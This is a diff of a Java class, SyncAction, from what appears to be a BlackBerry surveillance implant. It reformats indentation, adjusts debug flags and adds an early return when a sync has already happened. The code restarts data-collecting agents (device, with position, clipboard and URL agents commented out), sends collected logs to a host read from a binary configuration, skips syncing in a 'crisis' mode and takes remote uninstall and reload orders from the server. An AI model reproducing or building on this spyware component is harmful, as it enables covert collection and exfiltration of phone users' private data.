@@ -14,7 +14,6 @@ import java.util.Vector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
 import blackberry.Conf;
-import blackberry.Status;
 import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -30,177 +29,178 @@ import blackberry.utils.WChar;
  * The Class SyncAction.
  */
 public class SyncAction extends SubAction {
-	//#ifdef DEBUG
-	private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
-	//#endif
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+    //#endif
 
-	LogCollector logCollector;
-	AgentManager agentManager;
-	Transfer transfer;
+    LogCollector logCollector;
+    AgentManager agentManager;
+    Transfer transfer;
 
-	protected boolean wifiForced;
-	protected boolean wifi;
-	protected boolean gprs;
-	protected Vector apns;
+    protected boolean wifiForced;
+    protected boolean wifi;
+    protected boolean gprs;
+    protected Vector apns;
 
-	boolean ssl = false;
+    boolean ssl = false;
 
-	String host = "";
-	int port = 80;
+    String host = "";
+    int port = 80;
 
-	/**
-	 * Instantiates a new sync action.
-	 * 
-	 * @param actionId_
-	 *            the action id_
-	 * @param confParams
-	 *            the conf params
-	 */
-	public SyncAction(final int actionId_, final byte[] confParams) {
-		this(actionId_);
-		parse(confParams);
+    /**
+     * Instantiates a new sync action.
+     * 
+     * @param actionId_
+     *            the action id_
+     * @param confParams
+     *            the conf params
+     */
+    public SyncAction(final int actionId_, final byte[] confParams) {
+        this(actionId_);
+        parse(confParams);
 
-		//#ifdef DBC
-		Check.requires(actionId == ACTION_SYNC, "Wrong ActionId");
-		//#endif
+        //#ifdef DBC
+        Check.requires(actionId == ACTION_SYNC, "Wrong ActionId");
+        //#endif
 
-		logCollector = LogCollector.getInstance();
-		agentManager = AgentManager.getInstance();
-		transfer = Transfer.getInstance();
-	}
+        logCollector = LogCollector.getInstance();
+        agentManager = AgentManager.getInstance();
+        transfer = Transfer.getInstance();
+    }
 
-	/**
-	 * Instantiates a new sync action.
-	 * 
-	 * @param host_
-	 *            the host_
-	 */
-	public SyncAction(final String host_) {
-		super(ACTION_SYNC);
-		host = host_;
-	}
+    /**
+     * Instantiates a new sync action.
+     * 
+     * @param host_
+     *            the host_
+     */
+    public SyncAction(final String host_) {
+        super(ACTION_SYNC);
+        host = host_;
+    }
 
-	protected SyncAction(final int actionId) {
-		super(actionId);
-	}
+    protected SyncAction(final int actionId) {
+        super(actionId);
+    }
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.action.SubAction#execute(blackberry.event.Event)
-	 */
-	public final boolean execute(final Event triggeringEvent) {
-		//#ifdef DEBUG_INFO
-		debug.info("SyncAction execute: " + triggeringEvent);
-		//#endif
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
+     */
+    public final boolean execute(final Event triggeringEvent) {
+        //#ifdef DEBUG
+        debug.info("SyncAction execute: " + triggeringEvent);
+        //#endif
 
-		if (status.synced == true) {
-			//#ifdef DEBUG
-			debug.warn("Already synced in this action: skipping");
-			//#endif
-		}
+        if (status.synced == true) {
+            //#ifdef DEBUG
+            debug.warn("Already synced in this action: skipping");
+            //#endif
+            return false;
+        }
 
-		if (status.crisisSync()) {
-			//#ifdef DEBUG
-			debug.warn("SyncAction - no sync, we are in crisis");
-			//#endif
-			return false;
-		}
+        if (status.crisisSync()) {
+            //#ifdef DEBUG
+            debug.warn("SyncAction - no sync, we are in crisis");
+            //#endif
+            return false;
+        }
 
-		wantReload = false;
-		wantUninstall = false;
+        wantReload = false;
+        wantUninstall = false;
 
-		//#ifdef DBC
-		Check.asserts(logCollector != null, "logCollector == null");
-		//#endif
+        //#ifdef DBC
+        Check.asserts(logCollector != null, "logCollector == null");
+        //#endif
 
-		transferInit();
+        transferInit();
 
-		// Stop degli agenti che producono un singolo log
+        // Stop degli agenti che producono un singolo log
 
-		//agentManager.reStart(Agent.AGENT_POSITION);
-		//agentManager.reStart(Agent.AGENT_APPLICATION);
+        //agentManager.reStart(Agent.AGENT_POSITION);
+        //agentManager.reStart(Agent.AGENT_APPLICATION);
 
-		//agentManager.reStart(Agent.AGENT_CLIPBOARD);
-		//agentManager.reStart(Agent.AGENT_URL);
-		agentManager.reStart(Agent.AGENT_DEVICE);
+        //agentManager.reStart(Agent.AGENT_CLIPBOARD);
+        //agentManager.reStart(Agent.AGENT_URL);
+        agentManager.reStart(Agent.AGENT_DEVICE);
 
-		Utils.sleep(500);
+        Utils.sleep(500);
 
-		final boolean ret = transfer.startSession();
+        final boolean ret = transfer.startSession();
 
-		wantUninstall = transfer.uninstall;
-		wantReload = transfer.reload;
+        wantUninstall = transfer.uninstall;
+        wantReload = transfer.reload;
 
-		if (ret) {
-			//#ifdef DEBUG_INFO
-			debug.info("SyncAction OK");
-			//#endif
+        if (ret) {
+            //#ifdef DEBUG
+            debug.info("SyncAction OK");
+            //#endif
 
-			status.synced = true;
-			return true;
-		}
+            status.synced = true;
+            return true;
+        }
 
-		//#ifdef DEBUG
-		debug.error("InternetSend Unable to perform");
-		//#endif
+        //#ifdef DEBUG
+        debug.error("InternetSend Unable to perform");
+        //#endif
 
-		return false;
+        return false;
 
-	}
+    }
 
-	protected void transferInit() {
-		transfer.init(host, port, ssl, wifiForced, wifi, gprs);
+    protected void transferInit() {
+        transfer.init(host, port, ssl, wifiForced, wifi, gprs);
 
-	}
+    }
 
-	/*
-	 * (non-Javadoc)
-	 * @see blackberry.action.SubAction#parse(byte[])
-	 */
-	protected boolean parse(final byte[] confParams) {
-		final DataBuffer databuffer = new DataBuffer(confParams, 0,
-				confParams.length, false);
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#parse(byte[])
+     */
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
 
-		try {
-			gprs = databuffer.readInt() == 1;
-			wifi = databuffer.readInt() == 1;
+        try {
+            gprs = databuffer.readInt() == 1;
+            wifi = databuffer.readInt() == 1;
 
-			if (Conf.SYNCACTION_FORCE_WIFI) {
-				wifiForced = wifi;
-			} else {
-				wifiForced = false;
-			}
+            if (Conf.SYNCACTION_FORCE_WIFI) {
+                wifiForced = wifi;
+            } else {
+                wifiForced = false;
+            }
 
-			final int len = databuffer.readInt();
-			final byte[] buffer = new byte[len];
-			databuffer.readFully(buffer);
+            final int len = databuffer.readInt();
+            final byte[] buffer = new byte[len];
+            databuffer.readFully(buffer);
 
-			host = WChar.getString(buffer, true);
+            host = WChar.getString(buffer, true);
 
-		} catch (final EOFException e) {
-			//#ifdef DEBUG
-			debug.error("params FAILED");
-			//#endif
-			return false;
-		}
+        } catch (final EOFException e) {
+            //#ifdef DEBUG
+            debug.error("params FAILED");
+            //#endif
+            return false;
+        }
 
-		//#ifdef DEBUG_TRACE
-		final StringBuffer sb = new StringBuffer();
-		sb.append("gprs: " + gprs);
-		sb.append(" wifi: " + wifi);
-		sb.append(" wifiForced: " + wifiForced);
-		sb.append(" host: " + host);
-		debug.trace(sb.toString());
-		//#endif
+        //#ifdef DEBUG
+        final StringBuffer sb = new StringBuffer();
+        sb.append("gprs: " + gprs);
+        sb.append(" wifi: " + wifi);
+        sb.append(" wifiForced: " + wifiForced);
+        sb.append(" host: " + host);
+        debug.trace(sb.toString());
+        //#endif
 
-		return true;
-	}
+        return true;
+    }
 
-	public String toString() {
-		final StringBuffer sb = new StringBuffer();
-		sb.append("Sync gprs: " + gprs);
-		sb.append(" wifi: " + wifi);
-		sb.append(" host: " + host);
-		return sb.toString();
-	}
+    public String toString() {
+        final StringBuffer sb = new StringBuffer();
+        sb.append("Sync gprs: " + gprs);
+        sb.append(" wifi: " + wifi);
+        sb.append(" host: " + host);
+        return sb.toString();
+    }
 }
